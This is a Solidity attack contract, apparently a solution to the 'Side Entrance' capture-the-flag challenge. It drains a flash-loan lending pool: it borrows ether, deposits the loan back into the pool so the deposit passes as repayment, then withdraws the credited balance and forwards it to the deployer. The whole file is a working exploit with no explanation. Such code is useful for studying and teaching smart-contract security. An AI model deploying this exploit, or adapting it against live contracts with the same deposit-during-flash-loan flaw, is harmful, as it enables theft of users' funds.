pragma solidity ^0.8.0;

import "solmate/src/auth/Owned.sol";
import {SafeTransferLib} from "solmate/src/utils/SafeTransferLib.sol";
import {SideEntranceLenderPool} from "../side-entrance/SideEntranceLenderPool.sol";
import "hardhat/console.sol";


contract AttackSideEntrance {
    SideEntranceLenderPool pool;
    address payable owner;

    constructor(address _chal) {
        pool = SideEntranceLenderPool(_chal);
        owner = payable(msg.sender);
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }

    function execute() external payable {
        pool.deposit{value: address(this).balance}();
    }

    receive () external payable {
        owner.transfer(address(this).balance);
    }
}